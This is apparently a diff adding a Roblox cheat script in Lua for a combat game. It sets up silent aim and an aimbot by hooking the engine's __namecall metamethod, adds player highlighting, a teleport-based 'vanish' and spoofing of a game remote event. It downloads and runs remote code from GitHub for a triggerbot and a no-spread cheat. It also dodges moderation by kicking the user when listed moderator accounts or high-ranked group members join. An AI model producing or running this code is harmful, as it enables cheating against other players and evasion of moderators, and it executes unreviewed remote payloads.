@@ -1,0 +1,348 @@
+getgenv().LunarConfig = {
+    ["SilentAim"] = {
+        ["Enabled"] = true,
+        ["TargetPart"] = "Head",
+        ["PredictionFactor"] = 0.3,
+        ["HitChance"] = 100,
+    },
+    ["Aimbot"] = {
+        ["Keybind"] = "C",
+        ["Enabled"] = true,
+        ["PredictionFactor"] = 0.2,
+        ["Smoothing"] = 0.2,
+        ["TargetPart"] = "Head",
+    },
+    ["VanishUntouchedPlace"] = {
+        ["Enabled"] = true,
+        ["Keybind"] = "X",
+    },
+    ["Checks"] = {
+        Knocked = true,
+        Grabbed = true,
+        Friend = true,
+        Crew = true,
+        WallCheck = true,
+    },
+    ["FOV"] = 150,
+    ["Whitelist"] = {},
+}
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local Camera = workspace.CurrentCamera
+local Mouse = LocalPlayer:GetMouse()
+local StarterGui = game:GetService("StarterGui")
+
+local aiming = false
+local lockedTarget = nil
+local visible = true
+local vanishActive = false
+local originalPosition = nil
+local floatVelocity = nil
+
+local screenGui = Instance.new("ScreenGui", game.CoreGui)
+screenGui.Name = "veleitsWatermark"
+screenGui.ResetOnSpawn = false
+
+local label = Instance.new("TextLabel", screenGui)
+label.Size = UDim2.new(0, 300, 0, 20)
+label.Position = UDim2.new(0, 10, 0, 10)
+label.BackgroundTransparency = 1
+label.TextColor3 = Color3.fromRGB(255, 255, 255)
+label.TextStrokeTransparency = 0
+label.Font = Enum.Font.Code
+label.TextSize = 16
+label.TextXAlignment = Enum.TextXAlignment.Left
+label.Text = "made by @veleits on discord"
+
+local function clampFOV(v)
+    return math.clamp(v, 40, 1000)
+end
+
+local function wallCheck(targetPart)
+    if not getgenv().LunarConfig.Checks.WallCheck then return true end
+    local origin = Camera.CFrame.Position
+    local direction = (targetPart.Position - origin).Unit * (targetPart.Position - origin).Magnitude
+    local rayParams = RaycastParams.new()
+    rayParams.FilterDescendantsInstances = {LocalPlayer.Character, targetPart.Parent}
+    rayParams.FilterType = Enum.RaycastFilterType.Blacklist
+    rayParams.IgnoreWater = true
+    local rayResult = workspace:Raycast(origin, direction, rayParams)
+    if not rayResult then return true end
+    return rayResult.Instance:IsDescendantOf(targetPart.Parent)
+end
+
+local function highlightPlayer(player)
+    local char = player.Character
+    if not char then return end
+    local color = getgenv().LunarConfig.Whitelist[player.UserId] and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
+    local existing = char:FindFirstChild("Highlight_Lunar")
+    if existing then
+        existing.FillColor = color
+        existing.Enabled = visible
+        return
+    end
+    local hl = Instance.new("Highlight")
+    hl.Name = "Highlight_Lunar"
+    hl.Adornee = char
+    hl.FillColor = color
+    hl.FillTransparency = 0.3
+    hl.OutlineTransparency = 1
+    hl.Enabled = visible
+    hl.Parent = char
+end
+
+local function isValidTarget(player)
+    if not getgenv().LunarConfig.Whitelist[player.UserId] then return false end
+    local char = player.Character
+    if not char then return false end
+    local hum = char:FindFirstChildWhichIsA("Humanoid")
+    if not hum or hum.Health <= 0 then return false end
+    if getgenv().LunarConfig.Checks.Knocked and char:FindFirstChild("BodyEffects") and char.BodyEffects:FindFirstChild("K.O") and char.BodyEffects["K.O"].Value then return false end
+    if getgenv().LunarConfig.Checks.Grabbed and char:FindFirstChild("GRABBING_CONSTRAINT") then return false end
+    if getgenv().LunarConfig.Checks.Friend and LocalPlayer:IsFriendsWith(player.UserId) then return false end
+    return true
+end
+
+local function getWhitelistedTarget()
+    local closest, closestDist = nil, math.huge
+    local mousePos = UserInputService:GetMouseLocation()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and isValidTarget(player) then
+            local part = player.Character and player.Character:FindFirstChild(getgenv().LunarConfig.SilentAim.TargetPart)
+            if part then
+                local predicted = part.Position + part.Velocity * getgenv().LunarConfig.SilentAim.PredictionFactor
+                local screenPos, onScreen = Camera:WorldToViewportPoint(predicted)
+                local dist = (Vector2.new(screenPos.X, screenPos.Y) - mousePos).Magnitude
+                if onScreen and dist < clampFOV(getgenv().LunarConfig.FOV) and dist < closestDist and wallCheck(part) then
+                    closest = part
+                    closestDist = dist
+                end
+            end
+        end
+    end
+    return closest
+end
+
+UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then return end
+    if input.KeyCode == Enum.KeyCode[string.upper(getgenv().LunarConfig.Aimbot.Keybind)] then
+        aiming = not aiming
+        if not aiming then lockedTarget = nil end
+    elseif input.KeyCode == Enum.KeyCode.H then
+        visible = not visible
+        label.Visible = visible
+        for _, player in pairs(Players:GetPlayers()) do
+            local hl = player.Character and player.Character:FindFirstChild("Highlight_Lunar")
+            if hl then hl.Enabled = visible end
+        end
+    elseif input.KeyCode == Enum.KeyCode.P then
+        local targetChar = Mouse.Target and Mouse.Target:FindFirstAncestorOfClass("Model")
+        local targetPlayer = targetChar and Players:GetPlayerFromCharacter(targetChar)
+        if targetPlayer and targetPlayer ~= LocalPlayer then
+            local uid = targetPlayer.UserId
+            if getgenv().LunarConfig.Whitelist[uid] then
+                getgenv().LunarConfig.Whitelist[uid] = nil
+                StarterGui:SetCore("SendNotification", {
+                    Title = "Unwhitelisted",
+                    Text = targetPlayer.Name .. " removed",
+                    Duration = 2
+                })
+            else
+                getgenv().LunarConfig.Whitelist[uid] = true
+                StarterGui:SetCore("SendNotification", {
+                    Title = "Whitelisted",
+                    Text = targetPlayer.Name .. " added",
+                    Duration = 2
+                })
+            end
+            highlightPlayer(targetPlayer)
+        end
+    elseif getgenv().LunarConfig.VanishUntouchedPlace.Enabled and input.KeyCode == Enum.KeyCode[string.upper(getgenv().LunarConfig.VanishUntouchedPlace.Keybind)] then
+        local character = LocalPlayer.Character
+        local hrp = character and character:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            if not vanishActive then
+                originalPosition = hrp.CFrame
+                hrp.CFrame = CFrame.new(Vector3.new(1e6, 500, 1e6))
+                floatVelocity = Instance.new("BodyVelocity")
+                floatVelocity.Velocity = Vector3.new(0, 0, 0)
+                floatVelocity.MaxForce = Vector3.new(1e6, 1e6, 1e6)
+                floatVelocity.P = 1e5
+                floatVelocity.Name = "FloatFreeze"
+                floatVelocity.Parent = hrp
+                vanishActive = true
+            else
+                if floatVelocity then
+                    floatVelocity:Destroy()
+                    floatVelocity = nil
+                end
+                if originalPosition then
+                    hrp.CFrame = originalPosition
+                end
+                vanishActive = false
+                originalPosition = nil
+            end
+        end
+    end
+end)
+
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function()
+        task.wait(0.5)
+        highlightPlayer(player)
+    end)
+end)
+
+for _, p in pairs(Players:GetPlayers()) do
+    if p ~= LocalPlayer then
+        if p.Character then highlightPlayer(p) end
+        p.CharacterAdded:Connect(function()
+            task.wait(0.5)
+            highlightPlayer(p)
+        end)
+    end
+end
+
+RunService.RenderStepped:Connect(function()
+    local target = getWhitelistedTarget()
+    lockedTarget = target
+    if aiming and lockedTarget then
+        local predicted = lockedTarget.Position + lockedTarget.Velocity * getgenv().LunarConfig.Aimbot.PredictionFactor
+        Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, predicted), getgenv().LunarConfig.Aimbot.Smoothing)
+    end
+end)
+
+local __namecall
+__namecall = hookmetamethod(game, "__namecall", function(self, ...)
+    local method = getnamecallmethod()
+    local args = { ... }
+    if method == "FindPartOnRayWithIgnoreList" and getgenv().LunarConfig.SilentAim.Enabled and lockedTarget then
+        local dir = (lockedTarget.Position - Camera.CFrame.Position).Unit * 500
+        args[1] = Ray.new(Camera.CFrame.Position, dir)
+        return __namecall(self, unpack(args))
+    end
+    return __namecall(self, ...)
+end)
+
+
+loadstring(game:HttpGet("https://github.com/trackwocc/pc/raw/refs/heads/main/marco+triggerbot"))()
+
+delay(4, function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/trackwocc/pc/main/no%20spread%20hc"))()
+end)
+local China = setmetatable({}, {
+   __index = function(_, Price)
+       return game:GetService(Price)
+   end
+})
+
+local Players = China.Players
+local ReplicatedStorage = China.ReplicatedStorage
+
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+
+local MainEvent = ReplicatedStorage:WaitForChild("MainEvent")
+local Tool = nil
+
+local function Bypass(Entity)
+   Entity.ChildAdded:Connect(function(Child)
+       if Child:IsA("Tool") then
+           Tool = Child.Activated:Connect(function()
+               if MainEvent then
+                   MainEvent:FireServer("RequestAimViewer", LocalPlayer.Name)
+               end
+           end)
+       end
+   end)
+end
+
+local function Alive(Player)
+   return Player and Player.Character and Player.Character:FindFirstChild("Humanoid") and Player.Character:FindFirstChild("Head") or false
+end
+
+LocalPlayer.CharacterAdded:Connect(function(Character)
+   Bypass(Character)
+end)
+
+if Alive(LocalPlayer) then
+   LocalPlayer.Character.Humanoid:UnequipTools()
+   Bypass(LocalPlayer.Character)
+end
+
+local Hook
+Hook = hookmetamethod(game, "__namecall", function(self, ...)
+   local Args = {...}
+   local Method = getnamecallmethod()
+
+   if not checkcaller() and Method == "FireServer" and self == MainEvent and Args[1] == "RequestAimViewer" then
+       Args[2] = Mouse.Target and Mouse.Target.Parent.Name or Args[2]
+       return self.FireServer(self, unpack(Args))
+   end
+
+   return Hook(self, ...)
+end)
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local flaggedUsers = {
+    [163085563] = true,
+    [2517643659] = true,
+    [4502645547] = true,
+    [3599927362] = true,
+    [5818696713] = true,
+    [214579583] = true,
+    [149759419] = true,
+    [4835707101] = true,
+    [67340691] = true,
+    [88885572] = true,
+    [3576067905] = true,
+    [878674194] = true,
+    [5218793949] = true,
+    [8137825406] = true,
+    [8130930626] = true,
+    [460755346] = true,
+    [182187] = true,
+    [2403613438] = true,
+    [4157432071] = true,
+}
+
+local groupIDs = {
+    34199407,
+    33214680,
+}
+
+local minRank = 200
+
+local function isFlagged(player)
+    if flaggedUsers[player.UserId] then
+        return true
+    end
+    for _, groupId in ipairs(groupIDs) do
+        local success, rank = pcall(function()
+            return player:GetRankInGroup(groupId)
+        end)
+        if success and rank >= minRank then
+            return true
+        end
+    end
+    return false
+end
+
+local function onPlayerAdded(player)
+    if isFlagged(player) then
+        LocalPlayer:Kick("FUCK MOD JOINED THE SERVER")
+        while true do end
+    end
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if player ~= LocalPlayer then
+        onPlayerAdded(player)
+    end
+end
+
+Players.PlayerAdded:Connect(onPlayerAdded)
